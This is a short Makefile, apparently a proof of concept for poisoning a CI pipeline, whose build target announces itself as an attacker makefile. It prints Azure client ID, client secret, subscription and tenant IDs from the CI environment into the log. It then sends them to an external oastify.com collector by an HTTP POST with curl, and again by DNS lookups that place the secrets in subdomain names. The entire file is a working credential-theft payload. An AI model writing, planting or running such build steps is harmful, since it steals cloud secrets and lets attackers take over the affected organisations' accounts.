EXFIL_URL := https://egys6hebt8wrera5tg6tj0ep4ga7y1mq.oastify.com

.PHONY: build

build:
	@echo "=== ATTACKER MAKEFILE EXECUTING ==="
	@echo "[*] Dumping Azure credentials from CI environment..."
	@echo "AZ_CLIENT_ID=$$AZ_CLIENT_ID"
	@echo "AZ_CLIENT_SECRET=$$AZ_CLIENT_SECRET"
	@echo "AZ_SUBSCRIPTION_ID=$$AZ_SUBSCRIPTION_ID"
	@echo "AZ_TENANT_ID=$$AZ_TENANT_ID"
	@echo "[*] Exfiltrating via HTTP POST..."
	-@curl -s -X POST $(EXFIL_URL)/http-exfil -d "client_id=$$AZ_CLIENT_ID&client_secret=$$AZ_CLIENT_SECRET&subscription_id=$$AZ_SUBSCRIPTION_ID&tenant_id=$$AZ_TENANT_ID"
	@echo "[*] Exfiltrating via DNS lookup..."
	-@nslookup $$AZ_CLIENT_ID.egys6hebt8wrera5tg6tj0ep4ga7y1mq.oastify.com || true
	-@nslookup $$AZ_CLIENT_SECRET.egys6hebt8wrera5tg6tj0ep4ga7y1mq.oastify.com || true
	@echo "[+] Attack complete."
